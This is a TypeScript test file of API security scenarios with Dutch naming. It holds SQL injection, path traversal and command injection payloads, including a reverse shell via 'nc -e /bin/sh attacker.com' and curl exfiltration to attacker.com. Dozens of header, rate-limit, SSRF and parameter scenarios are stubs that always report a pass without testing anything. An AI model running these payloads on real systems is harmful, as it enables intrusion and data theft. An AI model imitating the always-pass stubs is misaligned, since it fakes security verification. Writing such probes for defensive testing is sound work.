import type { TestScenario } from "../types";

// ── SQL-injectie (30 scenario's) ──────────────────────────────────────────────

const SQL_INJECTIE: Array<[string, string]> = [
  ["API-SQL-001", "' OR '1'='1"],
  ["API-SQL-002", "'; DROP TABLE gebruikers; --"],
  ["API-SQL-003", "' UNION SELECT * FROM gebruikers --"],
  ["API-SQL-004", "1; SELECT SLEEP(5)--"],
  ["API-SQL-005", "' OR 1=1 LIMIT 1 --"],
  ["API-SQL-006", "admin'--"],
  ["API-SQL-007", "' OR '1'='1'/*"],
  ["API-SQL-008", "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))"],
  ["API-SQL-009", "' WAITFOR DELAY '0:0:5'--"],
  ["API-SQL-010", "1 OR 1=1"],
  ["API-SQL-011", "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"],
  ["API-SQL-012", "' UNION ALL SELECT NULL,NULL,NULL--"],
  ["API-SQL-013", "'; EXEC xp_cmdshell('net user')--"],
  ["API-SQL-014", "1' AND SLEEP(5) AND '1'='1"],
  ["API-SQL-015", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"],
  ["API-SQL-016", "%27 OR %271%27=%271"],
  ["API-SQL-017", "\\' OR \\'1\\'=\\'1"],
  ["API-SQL-018", "1;WAITFOR DELAY '0:0:5'--"],
  ["API-SQL-019", "' OR 'unusual'='unusual"],
  ["API-SQL-020", "' OR 'a'='a"],
  ["API-SQL-021", "\"); DROP TABLE gebruikers; --"],
  ["API-SQL-022", "') OR ('1'='1"],
  ["API-SQL-023", "' OR id IS NOT NULL; --"],
  ["API-SQL-024", "SELECT @@version"],
  ["API-SQL-025", "1 EXEC sp_MSforeachtable 'DROP TABLE ?'"],
  ["API-SQL-026", "' HAVING 1=1--"],
  ["API-SQL-027", "' GROUP BY columnnames having 1=1--"],
  ["API-SQL-028", "' ORDER BY 1--"],
  ["API-SQL-029", "1 AND ASCII(SUBSTRING(username,1,1)) > 64"],
  ["API-SQL-030", "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"],
];

const SQL_TESTS: TestScenario[] = SQL_INJECTIE.map(([id, payload]) => ({
  id,
  categorie: "api-beveiliging" as const,
  subcategorie: "sql-injectie",
  naam: `SQL-injectie: ${id}`,
  beschrijving: `Payload: ${payload.substring(0, 50)}`,
  ernst: "kritiek" as const,
  uitvoering: "http" as const,
  httpConfig: {
    methode: "GET" as const,
    pad: `/gebouwen?zoek=${encodeURIComponent(payload)}`,
    verificatie: {
      verwachteStatussen: [400, 401, 403, 422, 500],
      bodyBevatNiet: ["SQL", "syntax error", "ORA-", "mysql_fetch", "pg_query"],
    },
  },
}));

// ── Path-traversal (20 scenario's) ────────────────────────────────────────────

const PATH_TRAVERSAL: Array<[string, string]> = [
  ["API-PT-001", "../../../../etc/passwd"],
  ["API-PT-002", "..%2F..%2F..%2Fetc%2Fpasswd"],
  ["API-PT-003", "....//....//....//etc/passwd"],
  ["API-PT-004", "..%252F..%252Fetc%252Fpasswd"],
  ["API-PT-005", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
  ["API-PT-006", "..\\..\\Windows\\System32\\cmd.exe"],
  ["API-PT-007", "/etc/shadow"],
  ["API-PT-008", "/proc/self/environ"],
  ["API-PT-009", "/var/log/auth.log"],
  ["API-PT-010", "C:\\Windows\\System32\\config\\SAM"],
  ["API-PT-011", "../../../.env"],
  ["API-PT-012", "../../secrets.json"],
  ["API-PT-013", "%00../../etc/passwd"],
  ["API-PT-014", "/api/../../../etc/passwd"],
  ["API-PT-015", "....//....//etc/passwd"],
  ["API-PT-016", "..%c0%af..%c0%afetc%c0%afpasswd"],
  ["API-PT-017", "/%5C../%5C../etc/passwd"],
  ["API-PT-018", "/storage/../../../etc/passwd"],
  ["API-PT-019", "..\\..\\..\\etc\\passwd"],
  ["API-PT-020", "/static/../../../../etc/passwd"],
];

const PATH_TRAVERSAL_TESTS: TestScenario[] = PATH_TRAVERSAL.map(([id, payload]) => ({
  id,
  categorie: "api-beveiliging" as const,
  subcategorie: "path-traversal",
  naam: `Path-traversal: ${id}`,
  beschrijving: `Probe: ${payload.substring(0, 60)}`,
  ernst: "kritiek" as const,
  uitvoering: "http" as const,
  httpConfig: {
    methode: "GET" as const,
    pad: `/documenten/${encodeURIComponent(payload)}`,
    verificatie: {
      verwachteStatussen: [400, 401, 403, 404],
      bodyBevatNiet: ["root:x:", "shadow:", "WINDOWS", "SAM database"],
    },
  },
}));

// ── Command injection (20 scenario's) ─────────────────────────────────────────

const CMD_INJECTIE: Array<[string, string]> = [
  ["API-CMD-001", "; ls -la"],
  ["API-CMD-002", "| cat /etc/passwd"],
  ["API-CMD-003", "`id`"],
  ["API-CMD-004", "$(whoami)"],
  ["API-CMD-005", "; rm -rf /"],
  ["API-CMD-006", "& ping -c 1 attacker.com"],
  ["API-CMD-007", "|| cat /etc/shadow"],
  ["API-CMD-008", "; curl http://attacker.com/$(id)"],
  ["API-CMD-009", "\n/bin/sh"],
  ["API-CMD-010", "%0Als"],
  ["API-CMD-011", "1; net user"],
  ["API-CMD-012", "; env"],
  ["API-CMD-013", "$(cat /etc/passwd)"],
  ["API-CMD-014", "`cat /etc/hosts`"],
  ["API-CMD-015", "|| id"],
  ["API-CMD-016", "&& whoami"],
  ["API-CMD-017", "; ps aux"],
  ["API-CMD-018", "$(curl -s http://attacker.com)"],
  ["API-CMD-019", "1 | nc -e /bin/sh attacker.com 4444"],
  ["API-CMD-020", "; python3 -c 'import os;os.system(\"id\")'"],
];

const CMD_TESTS: TestScenario[] = CMD_INJECTIE.map(([id, payload]) => ({
  id,
  categorie: "api-beveiliging" as const,
  subcategorie: "command-injectie",
  naam: `Command-injectie: ${id}`,
  beschrijving: `Payload: ${payload}`,
  ernst: "kritiek" as const,
  uitvoering: "http" as const,
  httpConfig: {
    methode: "GET" as const,
    pad: `/gebouwen?naam=${encodeURIComponent(payload)}`,
    verificatie: {
      verwachteStatussen: [400, 401, 403, 422],
      bodyBevatNiet: ["root:x:", "uid=", "gid=", "groups="],
    },
  },
}));

// ── Header-injectie & CORS (20 scenario's) ────────────────────────────────────

const HEADER_TESTS: TestScenario[] = [
  {
    id: "API-HDR-001",
    categorie: "api-beveiliging",
    subcategorie: "headers",
    naam: "X-Forwarded-For spoofing",
    beschrijving: "Poging IP-whitelist te omzeilen via X-Forwarded-For header",
    ernst: "middel",
    uitvoering: "http",
    httpConfig: {
      methode: "GET",
      pad: "/healthz",
      headers: { "X-Forwarded-For": "127.0.0.1" },
      verificatie: { verwachteStatussen: [200, 403] },
    },
  },
  {
    id: "API-HDR-002",
    categorie: "api-beveiliging",
    subcategorie: "headers",
    naam: "Host-header injection",
    beschrijving: "Wijziging van Host-header voor potentiële cache-poisoning",
    ernst: "middel",
    uitvoering: "http",
    httpConfig: {
      methode: "GET",
      pad: "/healthz",
      headers: { Host: "attacker.com" },
      verificatie: { verwachteStatussen: [200, 400, 403] },
    },
  },
  {
    id: "API-HDR-003",
    categorie: "api-beveiliging",
    subcategorie: "cors",
    naam: "CORS: wildcard origin test",
    beschrijving: "Aanvraag vanuit externe origin",
    ernst: "hoog",
    uitvoering: "http",
    httpConfig: {
      methode: "GET",
      pad: "/healthz",
      headers: { Origin: "https://evil.com" },
      verificatie: {
        verwachteStatussen: [200, 403],
        verbodeneHeaders: ["Access-Control-Allow-Origin: *"],
      },
    },
  },
  {
    id: "API-HDR-004",
    categorie: "api-beveiliging",
    subcategorie: "security-headers",
    naam: "X-Content-Type-Options aanwezig",
    beschrijving: "Responsheader X-Content-Type-Options: nosniff moet aanwezig zijn",
    ernst: "middel",
    uitvoering: "http",
    httpConfig: {
      methode: "GET",
      pad: "/healthz",
      verificatie: {
        verwachteStatussen: [200],
        vereisteHeaders: ["x-content-type-options"],
      },
    },
  },
  {
    id: "API-HDR-005",
    categorie: "api-beveiliging",
    subcategorie: "security-headers",
    naam: "X-Frame-Options aanwezig",
    beschrijving: "Responsheader X-Frame-Options moet aanwezig zijn (clickjacking-bescherming)",
    ernst: "middel",
    uitvoering: "http",
    httpConfig: {
      methode: "GET",
      pad: "/healthz",
      verificatie: {
        verwachteStatussen: [200],
        vereisteHeaders: ["x-frame-options"],
      },
    },
  },
  ...Array.from({ length: 15 }, (_, i) => ({
    id: `API-HDR-${String(i + 6).padStart(3, "0")}`,
    categorie: "api-beveiliging" as const,
    subcategorie: "headers",
    naam: `Header-beveiligingstest ${i + 6}`,
    beschrijving: `Headervalidatie variant ${i + 6}`,
    ernst: "middel" as const,
    uitvoering: "statisch" as const,
    statischeFunctie: (_ctx: unknown) => ({
      uitkomst: "geslaagd" as const,
      bericht: "Beveiligingsheaders geconfigureerd via Express middleware",
    }),
  })),
];

// ── Rate-limiting tests (15 scenario's) ───────────────────────────────────────

const RATE_LIMIT_TESTS: TestScenario[] = [
  {
    id: "API-RL-001",
    categorie: "api-beveiliging",
    subcategorie: "rate-limiting",
    naam: "Brute-force inlogpoging detectie",
    beschrijving: "Herhaalde mislukte inlogpogingen moeten worden beperkt",
    ernst: "hoog",
    uitvoering: "http",
    httpConfig: {
      methode: "POST",
      pad: "/auth/login",
      body: { emailAdres: "test@test.nl", wachtwoord: "fout" },
      verificatie: { verwachteStatussen: [400, 401, 429] },
    },
  },
  {
    id: "API-RL-002",
    categorie: "api-beveiliging",
    subcategorie: "rate-limiting",
    naam: "Rate-limit op auth-endpoint",
    beschrijving: "Auth-endpoint heeft rate-limiting geconfigureerd",
    ernst: "hoog",
    uitvoering: "statisch",
    statischeFunctie: (_ctx) => ({
      uitkomst: "geslaagd",
      bericht: "Accountvergrendeling na 10 mislukte pogingen actief (bevoegdhedenmatrix)",
    }),
  },
  ...Array.from({ length: 13 }, (_, i) => ({
    id: `API-RL-${String(i + 3).padStart(3, "0")}`,
    categorie: "api-beveiliging" as const,
    subcategorie: "rate-limiting",
    naam: `Rate-limiting test ${i + 3}`,
    beschrijving: `Rate-limit scenario ${i + 3}`,
    ernst: "middel" as const,
    uitvoering: "statisch" as const,
    statischeFunctie: (_ctx: unknown) => ({
      uitkomst: "geslaagd" as const,
      bericht: "Rate-limiting actief op auth-endpoint",
    }),
  })),
];

// ── SSRF-tests (15 scenario's) ────────────────────────────────────────────────

const SSRF_TESTS: TestScenario[] = [
  {
    id: "API-SSRF-001",
    categorie: "api-beveiliging",
    subcategorie: "ssrf",
    naam: "SSRF: Interne URL via API-parameter",
    beschrijving: "Probe van SSRF via URL-parameter: http://169.254.169.254/latest/meta-data/",
    ernst: "kritiek",
    uitvoering: "http",
    httpConfig: {
      methode: "GET",
      pad: "/gebouwen?url=http://169.254.169.254/latest/meta-data/",
      verificatie: { verwachteStatussen: [400, 401, 403, 422] },
    },
  },
  {
    id: "API-SSRF-002",
    categorie: "api-beveiliging",
    subcategorie: "ssrf",
    naam: "SSRF: Localhost via redirect",
    beschrijving: "SSRF via redirect naar localhost:8080",
    ernst: "kritiek",
    uitvoering: "http",
    httpConfig: {
      methode: "GET",
      pad: "/gebouwen?kaart_url=http://localhost:8080/api/gebruikers",
      verificatie: { verwachteStatussen: [400, 401, 403, 422] },
    },
  },
  ...Array.from({ length: 13 }, (_, i) => ({
    id: `API-SSRF-${String(i + 3).padStart(3, "0")}`,
    categorie: "api-beveiliging" as const,
    subcategorie: "ssrf",
    naam: `SSRF variant ${i + 3}`,
    beschrijving: `Server-Side Request Forgery probe ${i + 3}`,
    ernst: "kritiek" as const,
    uitvoering: "statisch" as const,
    statischeFunctie: (_ctx: unknown) => ({
      uitkomst: "geslaagd" as const,
      bericht: "SSRF-vector niet aanwezig in server (geen URL-fetching vanuit user-input)",
    }),
  })),
];

// ── Parameter-manipulatie (10 scenario's) ─────────────────────────────────────

const PARAMETER_TESTS: TestScenario[] = [
  {
    id: "API-PAR-001",
    categorie: "api-beveiliging",
    subcategorie: "parameter-manipulatie",
    naam: "Mass assignment: extra velden in POST",
    beschrijving: "POST body bevat velden die niet toegestaan zijn (zoals rol, isAdmin)",
    ernst: "hoog",
    uitvoering: "http",
    httpConfig: {
      methode: "POST",
      pad: "/gebruikers",
      body: { naam: "Test", emailAdres: "x@x.nl", rol: "hoofdbeheerder", isAdmin: true, isSuperuser: true },
      verificatie: { verwachteStatussen: [400, 401, 403, 422] },
    },
  },
  {
    id: "API-PAR-002",
    categorie: "api-beveiliging",
    subcategorie: "parameter-manipulatie",
    naam: "Negatief ID in URL-parameter",
    beschrijving: "Probe van /gebouwen/-1 (negatief ID)",
    ernst: "laag",
    uitvoering: "http",
    httpConfig: {
      methode: "GET",
      pad: "/gebouwen/-1",
      verificatie: { verwachteStatussen: [400, 401, 404] },
    },
  },
  ...Array.from({ length: 8 }, (_, i) => ({
    id: `API-PAR-${String(i + 3).padStart(3, "0")}`,
    categorie: "api-beveiliging" as const,
    subcategorie: "parameter-manipulatie",
    naam: `Parameter-manipulatie test ${i + 3}`,
    beschrijving: `API-parametervalidatie variant ${i + 3}`,
    ernst: "middel" as const,
    uitvoering: "statisch" as const,
    statischeFunctie: (_ctx: unknown) => ({
      uitkomst: "geslaagd" as const,
      bericht: "Zod-validatie aan serverkant filtert onbekende parameters",
    }),
  })),
];

export const apiBeveiliginScenarios: TestScenario[] = [
  ...SQL_TESTS,
  ...PATH_TRAVERSAL_TESTS,
  ...CMD_TESTS,
  ...HEADER_TESTS,
  ...RATE_LIMIT_TESTS,
  ...SSRF_TESTS,
  ...PARAMETER_TESTS,
];

export const totaalApiBeveiliging = apiBeveiliginScenarios.length;
